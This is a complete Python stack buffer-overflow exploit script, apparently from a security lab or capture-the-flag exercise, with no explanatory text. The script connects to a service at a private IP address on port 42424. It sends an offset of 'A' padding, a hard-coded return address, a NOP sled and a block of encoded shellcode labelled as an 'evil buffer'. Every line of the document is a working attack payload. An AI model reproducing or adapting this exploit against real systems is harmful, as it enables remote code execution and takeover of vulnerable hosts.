import socket

ip = "10.185.10.55"
port = 42424

offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 20
payload =("\xdb\xdf\xd9\x74\x24\xf4\xbd\x39\xef\x1e\x15\x5b\x33\xc9"
"\xb1\x52\x31\x6b\x17\x03\x6b\x17\x83\xd2\x13\xfc\xe0\xd8"
"\x04\x83\x0b\x20\xd5\xe4\x82\xc5\xe4\x24\xf0\x8e\x57\x95"
"\x72\xc2\x5b\x5e\xd6\xf6\xe8\x12\xff\xf9\x59\x98\xd9\x34"
"\x59\xb1\x1a\x57\xd9\xc8\x4e\xb7\xe0\x02\x83\xb6\x25\x7e"
"\x6e\xea\xfe\xf4\xdd\x1a\x8a\x41\xde\x91\xc0\x44\x66\x46"
"\x90\x67\x47\xd9\xaa\x31\x47\xd8\x7f\x4a\xce\xc2\x9c\x77"
"\x98\x79\x56\x03\x1b\xab\xa6\xec\xb0\x92\x06\x1f\xc8\xd3"
"\xa1\xc0\xbf\x2d\xd2\x7d\xb8\xea\xa8\x59\x4d\xe8\x0b\x29"
"\xf5\xd4\xaa\xfe\x60\x9f\xa1\x4b\xe6\xc7\xa5\x4a\x2b\x7c"
"\xd1\xc7\xca\x52\x53\x93\xe8\x76\x3f\x47\x90\x2f\xe5\x26"
"\xad\x2f\x46\x96\x0b\x24\x6b\xc3\x21\x67\xe4\x20\x08\x97"
"\xf4\x2e\x1b\xe4\xc6\xf1\xb7\x62\x6b\x79\x1e\x75\x8c\x50"
"\xe6\xe9\x73\x5b\x17\x20\xb0\x0f\x47\x5a\x11\x30\x0c\x9a"
"\x9e\xe5\x83\xca\x30\x56\x64\xba\xf0\x06\x0c\xd0\xfe\x79"
"\x2c\xdb\xd4\x11\xc7\x26\xbf\xdd\xb0\x25\xbb\xb6\xc2\x35"
"\xd2\x1a\x4a\xd3\xbe\xb2\x1a\x4c\x57\x2a\x07\x06\xc6\xb3"
"\x9d\x63\xc8\x38\x12\x94\x87\xc8\x5f\x86\x70\x39\x2a\xf4"
"\xd7\x46\x80\x90\xb4\xd5\x4f\x60\xb2\xc5\xc7\x37\x93\x38"
"\x1e\xdd\x09\x62\x88\xc3\xd3\xf2\xf3\x47\x08\xc7\xfa\x46"
"\xdd\x73\xd9\x58\x1b\x7b\x65\x0c\xf3\x2a\x33\xfa\xb5\x84"
"\xf5\x54\x6c\x7a\x5c\x30\xe9\xb0\x5f\x46\xf6\x9c\x29\xa6"
"\x47\x49\x6c\xd9\x68\x1d\x78\xa2\x94\xbd\x87\x79\x1d\xdd"
"\x65\xab\x68\x76\x30\x3e\xd1\x1b\xc3\x95\x16\x22\x40\x1f"
"\xe7\xd1\x58\x6a\xe2\x9e\xde\x87\x9e\x8f\x8a\xa7\x0d\xaf"
"\x9e")

buffer =  overflow + retn + padding + payload+"\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")

